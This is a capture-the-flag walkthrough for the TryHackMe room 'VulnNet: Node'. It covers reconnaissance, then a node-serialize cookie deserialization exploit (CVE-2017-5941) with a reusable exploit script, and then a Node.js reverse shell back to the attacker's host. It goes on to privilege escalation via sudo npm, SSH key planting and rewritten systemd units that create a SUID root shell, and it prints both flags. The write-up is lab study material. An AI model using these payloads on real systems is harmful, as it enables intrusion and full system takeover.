| Category          | Details                                                                                           |
|-------------------|---------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [VulnNet: Node](https://tryhackme.com/room/vulnnetnode)                                           |  
| 🏷 **Type**       | THM Challenge                                                                                     |
| 🖥 **OS**         | Linux                                                                                             |
| 🎯 **Difficulty** | Easy                                                                                              |
| 📁 **Tags**       | Node.js, [CVE-2017-5941](https://nvd.nist.gov/vuln/detail/CVE-2017-5941), sudo npm, Systemd timer |

## Task 1: VulnNet: Node

### What is the user flag? (user.txt)

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Node]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-01 13:01 +0100
Nmap scan report for 10.82.190.192
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 65:c2:d0:76:74:c6:98:7f:c0:82:7e:72:9a:13:b1:ad (RSA)
|   256 97:79:f8:01:d7:17:e3:9c:42:26:f4:d4:2e:a6:66:07 (ECDSA)
|_  256 ef:18:8d:4f:34:f0:fc:39:28:c6:fb:23:0a:66:12:37 (ED25519)
8080/tcp open  http    Node.js Express framework
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.72 seconds
```

#### Discover encoded JSON in `session` cookie
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Node]
└─$ curl -Is http://$TARGET:8080 | grep -oP 'Set-Cookie:\s*session=\K[^;]+' | sed 's/%3D/=/g' | base64 --decode
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```
Since cookie contains encoded JSON, we will try unsafe deserialization ([CVE-2017-5941](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)) as our vector of attack. 

#### Start `nc` for RCE probing
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Node]
└─$ nc -lp 80
```

#### Send `curl` probe in `session` cookie
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Node]
└─$ CMD=$(echo -n '{"rce":"_$$ND_FUNC$$_function (){require('\''child_process'\'').exec('\''curl 192.168.130.56'\'');}()"}' | base64 -w 0) && \
curl -s http://$TARGET:8080 -H "Cookie: session=$CMD" -o /dev/null
```

#### Confirm vulnerability by `nc` receiving HTTP request
```
GET / HTTP/1.1
Host: 192.168.130.56
User-Agent: curl/7.68.0
Accept: */*
```

#### Prepare exploit for RCE
```
{ cat <<'EOF' > rce.sh
JS_CODE=$(echo $1 | tr '\n\t' ' ' | sed 's/[[:space:]]\+/ /g')
PAYLOAD=$(echo '{"rce":"_$$ND_FUNC$$_function (){'${JS_CODE}'}()"}' | base64 -w 0)
curl -s http://$TARGET:8080 -H "Cookie: session=$PAYLOAD" -o /dev/null
EOF
} && chmod +x rce.sh
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Node]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection
```
./rce.sh "$(
cat <<EOF
var net = require('net'),
    cp = require('child_process'),
    sh = cp.spawn('/bin/sh', []);
var client = new net.Socket();
client.connect(4444, '$LHOST', function() {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});
return /a/;
EOF
)"
```

#### Confirm foothold gained
```
connect to [192.168.130.56] from (UNKNOWN) [10.82.190.192] 44722
/usr/bin/script -qc /bin/bash /dev/null
www@ip-10-82-190-192:~/VulnNet-Node$ id
uid=1001(www) gid=1001(www) groups=1001(www)
```

#### List allowed `sudo` commands
```
www@ip-10-82-190-192:~/VulnNet-Node$ sudo -l
sudo -l
Matching Defaults entries for www on ip-10-82-190-192:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on ip-10-82-190-192:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

#### Escalate to `serv-manage` using `sudo npm`
```
www@ip-10-82-190-192:~/VulnNet-Node$ echo '{"scripts": {"pe": "/bin/sh"}}' > package.json && sudo -u serv-manage /usr/bin/npm -C . run pe

> @ pe /home/www/VulnNet-Node
> /bin/sh

$ id
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
```

#### Capture user flag
```
$ cat /home/serv-manage/user.txt
THM{064640a2f880ce9ed7a54886f1bde821}
```

### What is the root flag? (root.txt)

#### Generate SSH private key
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Node]
└─$ ssh-keygen -q -t rsa -b 4096 -f id_rsa -N "" -C "$RANDOM@$RANDOM.net" && cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCFoJthNY7k4+kQ1hsvA7QvbmMzAmh9B9WDsi6c0Sld4OMNfqNteDfLH+rAbdmdkzYPybbdtZ+Z59fvXbbHq7UJ78KihwbAzx7eI66e/d8cwHEeEOngK/wqvIR8JftEqsYue8hvWluVROkiFengrJ/EEqPWDBgovytSehGEGCsVpXGAWWM5tOfIss4T2IGeTOwo98HqtwubfYYP5W6GzX/X+GaXxl+T4jrmgwMBXP9QMa/xV2P40e8eZKWI8UTLo/Co4O5A6tzG7jEmw1Ui92gVLVixXnWb9S01WFWz91LeisrIvhoIbhFw+Hi1aUohmvRdmjuSO9u44M5sTsayhApsbSmEvO7WLlbs55c4boG8iQItXJq5Tm+kI+1yw0wnieBqfSTfdIiyfCTlbjJ7u+mYValbBOKZ1g60gCKvnwKuw3LLsyoCfhYiPclRzk2cR23YFzM4OLyIlXWtwPObroLg610qqko8zCK6ucjmDU3WhEHNRvEr2Ijim4aks8Q1vLeisfCcqT9pzIKeVZ72yhYleMdM8FiG3qDTjunuij6lm8uzP4UpphlsITHCdWsL+rnICwSyAVzGAhjZ55kqjFVGrmXze61WaUYm64ummM6Z5P0qKKKtCgB4+Q/YExbK6Z+271paGhIW5UrLAse9EQ3RJm8pQIP+Ryhz8su+CTpk7w== 30974@25031.net
```

#### Authorize public key for generated SSH private key
```
$ mkdir /home/serv-manage/.ssh && \
chmod 700 /home/serv-manage/.ssh && \
touch /home/serv-manage/.ssh/authorized_keys && \
chmod 600 /home/serv-manage/.ssh/authorized_keys && \
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCFoJthNY7k4+kQ1hsvA7QvbmMzAmh9B9WDsi6c0Sld4OMNfqNteDfLH+rAbdmdkzYPybbdtZ+Z59fvXbbHq7UJ78KihwbAzx7eI66e/d8cwHEeEOngK/wqvIR8JftEqsYue8hvWluVROkiFengrJ/EEqPWDBgovytSehGEGCsVpXGAWWM5tOfIss4T2IGeTOwo98HqtwubfYYP5W6GzX/X+GaXxl+T4jrmgwMBXP9QMa/xV2P40e8eZKWI8UTLo/Co4O5A6tzG7jEmw1Ui92gVLVixXnWb9S01WFWz91LeisrIvhoIbhFw+Hi1aUohmvRdmjuSO9u44M5sTsayhApsbSmEvO7WLlbs55c4boG8iQItXJq5Tm+kI+1yw0wnieBqfSTfdIiyfCTlbjJ7u+mYValbBOKZ1g60gCKvnwKuw3LLsyoCfhYiPclRzk2cR23YFzM4OLyIlXWtwPObroLg610qqko8zCK6ucjmDU3WhEHNRvEr2Ijim4aks8Q1vLeisfCcqT9pzIKeVZ72yhYleMdM8FiG3qDTjunuij6lm8uzP4UpphlsITHCdWsL+rnICwSyAVzGAhjZ55kqjFVGrmXze61WaUYm64ummM6Z5P0qKKKtCgB4+Q/YExbK6Z+271paGhIW5UrLAse9EQ3RJm8pQIP+Ryhz8su+CTpk7w== 30974@25031.net' > /home/serv-manage/.ssh/authorized_keys
```

#### Upgrade connection to SSH
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Node]
└─$ ssh -i id_rsa serv-manage@$TARGET
<SNIP>
serv-manage@ip-10-82-190-192:~$ id
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
```

#### List allowed `sudo` commands
```
serv-manage@ip-10-82-190-192:~$ sudo -l
Matching Defaults entries for serv-manage on ip-10-82-190-192:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on ip-10-82-190-192:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```
It seems that user `serv-manage` controls Systemd `vulnnet-auto.timer`.

#### Check what service is started by `vulnnet-auto.timer`
```
serv-manage@ip-10-82-190-192:~$ cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```
It runs `vulnnet-job.service` every 30 mins.

#### Check what `vulnnet-job.service` is going
```
serv-manage@ip-10-82-190-192:~$ cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```
It simply checks disk usage with `df` 

#### Check write permissions to `vulnnet` service files
```
serv-manage@ip-10-82-190-192:~$ ls -l /etc/systemd/system/vulnnet-*
-rw-rw-r-- 1 root serv-manage  88 Feb  3 07:59 /etc/systemd/system/vulnnet-auto.timer
-rw-rw-r-- 1 root serv-manage 134 Feb  3 07:59 /etc/systemd/system/vulnnet-job.service
```
With write permission and ability to start `vulnnet` service (with `sudo`) we could spawn root shell. 

#### Spawn root shell using `vulnnet` service
```
serv-manage@ip-10-82-169-155:~$ { cat <<'EOF' > /etc/systemd/system/vulnnet-auto.timer
[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=vulnnet-job.service

[Install]
WantedBy=timers.target
EOF
} && \
{ cat <<'EOF'> /etc/systemd/system/vulnnet-job.service
[Unit]
Wants=vulnnet-auto.timer

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /bin/bash /tmp/root_shell && /bin/chmod +s /tmp/root_shell"

[Install]
WantedBy=multi-user.target
EOF
} && \
sudo /bin/systemctl daemon-reload && \
sudo /bin/systemctl stop vulnnet-auto.timer && \
sudo /bin/systemctl start vulnnet-auto.timer && \
sleep 1 && \
ls -l /tmp/root_shell
-rwsr-sr-x 1 root root 1183448 Feb  3 08:40 /tmp/root_shell
```

#### Escalate privileges to `root` using `/tmp/root_shell`
```
serv-manage@ip-10-82-169-155:~$ /tmp/root_shell -p
root_shell-5.0# id
uid=1000(serv-manage) gid=1000(serv-manage) euid=0(root) egid=0(root) groups=0(root),1000(serv-manage)
```

#### Capture root flag
```
root_shell-5.0# cat /root/root.txt 
THM{abea728f211b105a608a720a37adabf9}
```
